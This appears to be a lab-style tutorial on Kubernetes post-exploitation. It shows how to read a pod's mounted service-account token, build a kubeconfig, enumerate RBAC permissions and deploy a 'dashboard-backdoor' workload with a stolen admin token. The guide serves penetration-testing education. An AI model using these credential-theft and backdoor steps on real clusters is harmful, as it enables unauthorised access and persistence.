You are inside a pod. That is not the end state. Every pod gets a **service account** and three files mounted automatically. Those files are often enough to drive `kubectl` against the API server.

## The three files

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

```
Pod filesystem
  /var/run/secrets/kubernetes.io/serviceaccount/
    ├── token      ──┐
    ├── ca.crt     ──┼──► kubeconfig.yaml ──► kubectl auth can-i --list
    └── namespace  ──┘
                              │
                              ▼
                    RBAC decides what you can do
```

## Build kubeconfig from the pod

Export variables (Linux):

```bash
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export CA=$(base64 -w0 /var/run/secrets/kubernetes.io/serviceaccount/ca.crt)
export NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
export SERVER=https://192.168.13.128:6443
export CLUSTER_NAME=cluster.local
```

macOS base64 lacks `-w0`:

```bash
export CA=$(base64 -i /var/run/secrets/kubernetes.io/serviceaccount/ca.crt | tr -d '\n')
```

Write `initial_kubeconfig.yaml`:

```yaml
apiVersion: v1
kind: Config
clusters:
- name: ${CLUSTER_NAME}
  cluster:
    server: ${SERVER}
    certificate-authority-data: ${CA}
contexts:
- name: initial-context
  context:
    cluster: ${CLUSTER_NAME}
    user: vuln-sa
    namespace: ${NAMESPACE}
current-context: initial-context
users:
- name: vuln-sa
  user:
    token: ${TOKEN}
```

Substitute the env vars (or use `envsubst`).

## Enumerate permissions

```bash
kubectl --kubeconfig=initial_kubeconfig.yaml auth can-i --list
```

Read the `RESOURCE` and `VERB` columns. Look for `pods/exec`, `secrets`, `create`, `*` verbs, and missing namespace restrictions in `RESOURCE NAMES`.

```bash
kubectl --kubeconfig=initial_kubeconfig.yaml cluster-info
kubectl --kubeconfig=initial_kubeconfig.yaml cluster-info dump
kubectl --kubeconfig=initial_kubeconfig.yaml get pods -n kube-system
kubectl --kubeconfig=initial_kubeconfig.yaml get deployments -A
```

## Kubernetes Dashboard

Dashboard exposed on NodePort (e.g. `https://192.168.12.198:31111`) with a cluster-admin token is full cluster control from a browser. Treat dashboard NodePorts like admin panels.

Deploy from dashboard or with a stolen admin token:

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: dashboard-backdoor-sa
  namespace: dev
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: dashboard-backdoor
  namespace: dev
spec:
  replicas: 1
  selector:
    matchLabels:
      app: dashboard-backdoor
  template:
    metadata:
      labels:
        app: dashboard-backdoor
    spec:
      serviceAccountName: dashboard-backdoor-sa
      containers:
      - name: podmayhem
        image: securecorporation/infinity-k8s:podmayhem
```

## GKE / cloud kubeconfig

With cloud credentials (GCP example):

```bash
gcloud auth login
gcloud components install kubectl
gcloud components install gke-gcloud-auth-plugin
gcloud container cluster get-credentials <cluster-name> --zone <zone> --project <project>
kubectl get ns
kubectl get all -n kube-system
kubectl get all -n gke-managed-system
```

Cloud IAM + Kubernetes RBAC stack. Compromising the cloud account often gives you a kubeconfig for free.
